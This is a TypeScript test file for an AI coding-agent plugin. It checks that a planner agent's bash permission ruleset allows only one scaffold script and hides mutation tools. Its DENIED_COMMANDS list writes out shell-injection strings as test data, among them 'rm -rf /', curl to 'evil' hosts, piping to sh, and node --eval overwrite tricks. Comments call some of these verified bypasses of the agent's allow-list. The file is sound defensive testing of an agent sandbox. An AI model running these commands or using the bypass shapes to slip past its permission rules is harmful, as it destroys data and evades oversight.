/// <reference types="bun-types" />

import { describe, expect, it } from "bun:test"
import type { OhMyOpenCodeConfig } from "../config"
import { OhMyOpenCodeConfigSchema } from "../config"
import { applyToolConfig } from "./tool-config-handler"

type TestAgent = {
  permission?: Record<string, unknown>
}

function createParams(agentNames: readonly string[]): {
  readonly config: Record<string, unknown>
  readonly pluginConfig: OhMyOpenCodeConfig
  readonly agentResult: Record<string, TestAgent>
} {
  const agentResult: Record<string, TestAgent> = {}
  for (const agentName of agentNames) {
    agentResult[agentName] = { permission: {} }
  }

  return {
    config: { tools: {}, permission: {} },
    pluginConfig: OhMyOpenCodeConfigSchema.parse({}),
    agentResult,
  }
}

function requirePermission(
  agentResult: Record<string, TestAgent>,
  agentName: string,
): Record<string, unknown> {
  const permission = agentResult[agentName]?.permission
  if (!permission) {
    throw new Error(`Missing permission for ${agentName}`)
  }
  return permission
}

/**
 * Mirrors OpenCode core Permission.disabled() (packages/opencode/src/permission/index.ts):
 * a tool is hidden from the tool list IFF the LAST rule matching its permission key has
 * pattern "*" AND action "deny". A granular object keeps the tool VISIBLE because its last
 * rule has a specific (non-"*") pattern. This is the exact contract the granular bash
 * ruleset relies on, so we assert the produced shape drives that outcome.
 */
function isHiddenByRuleset(permission: Record<string, unknown>, toolKey: string): boolean {
  const value = permission[toolKey]
  if (value === undefined) return false
  if (typeof value === "string") return value === "deny"
  // object form: last entry decides visibility under findLast(pattern==="*" && deny)
  const entries = Object.entries(value as Record<string, string>)
  const last = entries[entries.length - 1]
  return last?.[0] === "*" && last?.[1] === "deny"
}

describe("applyToolConfig prometheus granular permissions", () => {
  describe("#given prometheus agent (planner) — bash visibility (#1)", () => {
    describe("#when applying tool config", () => {
      it("#then bash is a granular object, NOT a flat deny, so the tool stays visible", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "prometheus")
        expect(typeof permission.bash).toBe("object")
        expect(isHiddenByRuleset(permission, "bash")).toBe(false)
      })

      it("#then the bash ruleset denies '*' but allows the scaffold-plan.mjs command", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "prometheus")
        const bash = permission.bash as Record<string, string>
        expect(bash["*"]).toBe("deny")
        const scaffoldKey = Object.keys(bash).find((k) => k.includes("scaffold-plan.mjs"))
        expect(scaffoldKey).toBeDefined()
        expect(bash[scaffoldKey as string]).toBe("allow")
      })

      it("#then the '*' deny entry precedes every allow entry (findLast visibility ordering)", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then — the wildcard deny must not be the last entry, or the tool would hide
        const permission = requirePermission(params.agentResult, "prometheus")
        const keys = Object.keys(permission.bash as Record<string, string>)
        expect(keys[0]).toBe("*")
        expect(keys[keys.length - 1]).not.toBe("*")
      })

      it("#then git/just are NOT allow-listed (their own flags are an unbounded RCE surface)", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then — scaffold is the ONLY allowed executable; git --output / just are not
        const permission = requirePermission(params.agentResult, "prometheus")
        const bash = permission.bash as Record<string, string>
        const allowed = Object.entries(bash).filter(([, v]) => v === "allow").map(([k]) => k)
        expect(allowed.some((k) => k.startsWith("git"))).toBe(false)
        expect(allowed.some((k) => k.startsWith("just"))).toBe(false)
        expect(allowed.every((k) => k.includes("scaffold-plan.mjs"))).toBe(true)
      })

      it("#then the scaffold allow anchors the path with '/' so an option cannot be the first arg", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then — pattern requires `node "/...scaffold-plan.mjs"`, blocking node "--eval=...//scaffold-plan.mjs"
        const permission = requirePermission(params.agentResult, "prometheus")
        const bash = permission.bash as Record<string, string>
        const scaffoldKey = Object.keys(bash).find((k) => k.includes("scaffold-plan.mjs")) as string
        expect(scaffoldKey.includes('"/')).toBe(true)
      })

      it("#then interactive_bash stays flat-denied (hidden) — planner needs no live terminal", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "prometheus")
        expect(permission.interactive_bash).toBe("deny")
        expect(isHiddenByRuleset(permission, "interactive_bash")).toBe(true)
      })
    })
  })

  describe("#given prometheus agent — AFT mutation tools hidden (#2)", () => {
    const HIDDEN_MUTATION_TOOLS = [
      "aft_delete",
      "aft_move",
      "aft_refactor",
      "aft_import",
      "ast_grep_replace",
      "aft_safety",
    ] as const

    describe("#when applying tool config", () => {
      for (const toolKey of HIDDEN_MUTATION_TOOLS) {
        it(`#then ${toolKey} is flat-denied (hidden from the planner)`, () => {
          // given
          const params = createParams(["prometheus"])

          // when
          applyToolConfig(params)

          // then
          const permission = requirePermission(params.agentResult, "prometheus")
          expect(permission[toolKey]).toBe("deny")
          expect(isHiddenByRuleset(permission, toolKey)).toBe(true)
        })
      }
    })
  })


  describe("#given prometheus bash ruleset — shell-injection shapes denied (whole-command match)", () => {
    // OpenCode's bash tool passes the WHOLE raw command string as the single permission
    // resource (no shell parsing), so a trailing "*" glob would swallow "&& rm -rf /".
    // Metachar deny rules layered AFTER the allows make evaluate()'s findLast pick the deny.
    function evaluateBash(permission: Record<string, unknown>, command: string): string {
      const bash = permission.bash as Record<string, string>
      const rules = Object.entries(bash).map(([pattern, action]) => ({ pattern, action }))
      const wildcardMatch = (str: string, pattern: string): boolean => {
        const esc = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*")
        return new RegExp("^" + esc + "$", "s").test(str)
      }
      const rule = rules.findLast((r) => wildcardMatch(command, r.pattern))
      return rule?.action ?? "ask"
    }

    describe("#when applying tool config", () => {
      const DENIED_COMMANDS = [
        "git log --oneline && rm -rf /",
        "git log > package.json",
        "git status; curl http://evil",
        "git diff | sh",
        "node -e 'require(\"child_process\").exec(\"rm -rf /\")' scaffold-plan.mjs",
        "just --list `whoami`",
        "git log $(curl evil)",
        "rm -rf /",
        "curl http://evil.example",
        // reviewer round-2 verified bypasses: executables cannot be prefix-allowlisted —
        // their own flags are an unbounded RCE/mutation surface, so git/just are dropped and
        // node code-exec long-options are denied.
        'node "--eval=require(\'node:fs\').writeFileSync(\'package.json\',\'pwn\')//scaffold-plan.mjs" x',
        "git diff --output=package.json",
        "git log --output=package.json",
        "git status --short",
        "just --list",
        'node --eval "x" "/abs/scaffold-plan.mjs"',
        'node "/abs/scaffold-plan.mjs" --import evil.js',
      ] as const

      for (const cmd of DENIED_COMMANDS) {
        it(`#then denies "${cmd}"`, () => {
          // given
          const params = createParams(["prometheus"])

          // when
          applyToolConfig(params)

          // then
          const permission = requirePermission(params.agentResult, "prometheus")
          expect(evaluateBash(permission, cmd)).toBe("deny")
        })
      }

      const ALLOWED_COMMANDS = [
        'node "/skills/ulw-plan/scripts/scaffold-plan.mjs" my-slug',
        'node "/abs/ulw-plan/scripts/scaffold-plan.mjs" my-slug --clear',
        'node "/abs/scaffold-plan.mjs" prometheus-permissions --unclear',
      ] as const

      for (const cmd of ALLOWED_COMMANDS) {
        it(`#then allows "${cmd}"`, () => {
          // given
          const params = createParams(["prometheus"])

          // when
          applyToolConfig(params)

          // then
          const permission = requirePermission(params.agentResult, "prometheus")
          expect(evaluateBash(permission, cmd)).toBe("allow")
        })
      }

      it("#then bash stays VISIBLE (last rule pattern is not a bare '*')", () => {
        // given
        const params = createParams(["prometheus"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "prometheus")
        expect(isHiddenByRuleset(permission, "bash")).toBe(false)
      })
    })
  })

  describe("#given prometheus agent — read-only sensory surface KEPT (user condition 1)", () => {
    const SENSORY_TOOLS = [
      "aft_search",
      "aft_outline",
      "aft_zoom",
      "aft_callgraph",
      "aft_inspect",
      "aft_conflicts",
      "ast_grep_search",
      "lsp_diagnostics",
      "lsp_goto_definition",
      "lsp_find_references",
    ] as const

    describe("#when applying tool config", () => {
      for (const toolKey of SENSORY_TOOLS) {
        it(`#then ${toolKey} is never flat-denied (stays visible)`, () => {
          // given
          const params = createParams(["prometheus"])

          // when
          applyToolConfig(params)

          // then — either untouched (undefined) or explicitly not a flat deny
          const permission = requirePermission(params.agentResult, "prometheus")
          expect(isHiddenByRuleset(permission, toolKey)).toBe(false)
        })
      }
    })
  })

  describe("#given other agents — regression (S6)", () => {
    describe("#when applying tool config", () => {
      it("#then sisyphus keeps task allowed and gets no bash/aft denies", () => {
        // given
        const params = createParams(["sisyphus"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "sisyphus")
        expect(permission.task).toBe("allow")
        expect(permission.bash).toBeUndefined()
        expect(permission.aft_delete).toBeUndefined()
      })

      it("#then atlas (orchestrator) flat-denies the mutation surface but keeps sensory tools visible", () => {
        // given
        const params = createParams(["atlas"])

        // when
        applyToolConfig(params)

        // then — orchestrator boundary enforced in code: no writing, no mutation
        const permission = requirePermission(params.agentResult, "atlas")
        const MUTATION = [
          "edit",
          "write",
          "aft_refactor",
          "aft_import",
          "aft_move",
          "aft_delete",
          "aft_safety",
          "ast_grep_replace",
        ] as const
        for (const toolKey of MUTATION) {
          expect(permission[toolKey]).toBe("deny")
          expect(isHiddenByRuleset(permission, toolKey)).toBe(true)
        }
        // sensory/discovery tools stay visible (allow-by-default, never denied)
        for (const toolKey of ["aft_search", "aft_outline", "aft_zoom", "aft_callgraph", "aft_inspect"]) {
          expect(isHiddenByRuleset(permission, toolKey)).toBe(false)
        }
      })

      it("#then sisyphus-junior permission block is unchanged by the prometheus edit", () => {
        // given
        const params = createParams(["sisyphus-junior"])

        // when
        applyToolConfig(params)

        // then
        const permission = requirePermission(params.agentResult, "sisyphus-junior")
        expect(permission["task_*"]).toBe("allow")
        expect(permission.teammate).toBe("allow")
        expect(permission.bash).toBeUndefined()
      })
    })
  })
})
